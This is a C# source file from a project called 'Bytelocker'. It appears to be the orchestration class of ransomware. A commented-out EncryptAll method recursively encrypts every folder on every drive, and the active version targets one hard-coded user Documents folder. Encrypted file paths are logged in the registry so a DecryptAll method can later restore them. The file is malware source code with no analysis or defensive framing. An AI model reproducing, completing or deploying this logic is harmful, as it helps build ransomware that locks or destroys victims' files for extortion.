using Bytelocker.Settings;
using System;
using System.Collections.Generic;

namespace Bytelocker.CryptoManager
{
    class CryptoManagerMainHandler
    {
        private RegistryManager rm;

        public CryptoManagerMainHandler()
        {
            this.rm = new RegistryManager();
            this.rm.CreateMainKey();
        }

        public void DecryptSingleFile(String file)
        {
            FileManager fm = new FileManager();
            fm.ChooseFile(file);
            fm.SetupFileEncrypter();
            fm.DecryptFile();
        }

        public void DecryptAll()
        {
            FileManager fm = new FileManager();

            try
            {
                List<String> files = rm.ReadAllValues(RegistryManager.FILES_KEY_NAME);

                foreach (String file_path in files)
                {
                    fm.ChooseFile(file_path);
                    fm.SetupFileEncrypter();
                    if (fm.DecryptFile())
                    {
                        fm.DeleteFile();
                        fm.RenameTmpFileToOrig();
                    }
                }
            }
            catch (Exception)
            {
            }
        }
        /*
        public void EncryptAll()
        {
            DirManager dfm = new DirManager();

            foreach (DriveInfo drive in DriveInfo.GetDrives())
            {
                List<String> dirs = DirManager.GetFoldersRecursive(drive.ToString());
                foreach (String subDir in dirs)
                {
                    dfm.ChooseDir(subDir);
                    dfm.EncryptDir();
                }
            }
        }
        */


        public void EncryptAll()
        {
            DirManager dfm = new DirManager();
            List<String> dirs = DirManager.GetFoldersRecursive(@"C:\Users\nic\Documents\personal");
            foreach (String subDir in dirs)
            {
                dfm.ChooseDir(subDir);
                dfm.EncryptDir();
            }
        }

        public List<String> FilesEncryptedList()
        {
            try
            {
                return new List<String>(rm.ReadAllValues(RegistryManager.FILES_KEY_NAME));
            } catch (Exception)
            {
                // if the key does not exist return empty list
                return new List<String>();
            }
            
        }
    }
}
